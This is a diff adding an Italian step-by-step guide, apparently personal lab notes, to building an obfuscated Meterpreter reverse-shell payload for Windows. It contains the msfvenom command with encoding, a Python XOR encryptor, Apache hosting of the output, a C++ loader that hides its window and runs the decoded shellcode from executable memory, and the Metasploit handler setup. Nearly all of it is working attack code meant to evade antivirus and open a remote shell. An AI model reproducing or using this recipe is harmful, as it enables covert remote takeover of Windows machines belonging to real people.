@@ -1,0 +1,69 @@
+1. Creazione del payload
+msfvenom -p windows/x64/meterpreter_reverse_tcp -e x86/shikata_ga_nai -i 10 LHOST="il tuo IP" LPORT=4444 -f raw -o raw.txt
+################################################################################################################################
+2)
+nano xor_encryptor.py
+################################################################################################################################
+Copio questo cdice:
+ 
+import sys
+KEY = "x"
+def xor(data, key):
+	key = str(key)
+	l = len(key)
+	output_str = ""
+	for i in range(len(data)):
+		current = data[i]
+		current_key = key[i % len(key)]
+		output_str += chr(ord(current) ^ ord(current_key))
+	return output_str
+def printCiphertext(ciphertext):
+	print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
+try:
+	plaintext = open(sys.argv[1], "rb").read()
+except:
+	print("File argument needed! %s " % sys.argv[0])
+	sys.exit()
+ciphertext = xor(plaintext, KEY)
+print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
+################################################################################################################################
+3. Eseguire il comando:
+python xor_encryptor.py raw.txt > xor_output.txt
+################################################################################################################################
+4. Adesso attiviamo il web services per poter scaricare il file sulla macchina di windows dove c'è il compilatore:
+
+sudo service apache2 stop
+sudo service apache2 start
+sudo service apache2 status
+
+sposto il file xor_output.txt nella cartella www
+sudo mv xor_output.txt /var/www/html/   
+################################################################################################################################
+_________________________________________________________________________________________________________________________________________________________
+
+5. Mi sposto sulla macchina windows per compilare il file tramite il software Dev-C++
+ 
+#include <cstring>
+#define _WIN32_WINNT 0x0500
+#include<windows.h>
+ 
+int main(int argc, char **argv) {
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	char b[] = { /*xor_output*/};
+	char c[sizeof b];
+	for (int i = 0; i < sizeof b; i++) {c[i] = b[i] ^ 'x';}
+	void *exec = VirtualAlloc(0, sizeof c, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	memcpy(exec, c, sizeof c);
+	((void(*)())exec)();		
+}
+################################################################################################################################
+6. Torno in Kali Linux ed eseguo msfconsole
+Inserisco il comando per mettere in ascolto Kali
+sudo msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter_reverse_tcp
+set LHOST "L'ip di Kali"
+set LPORT 4444
+run
+################################################################################################################################
+7. Eseguo il file da Windows
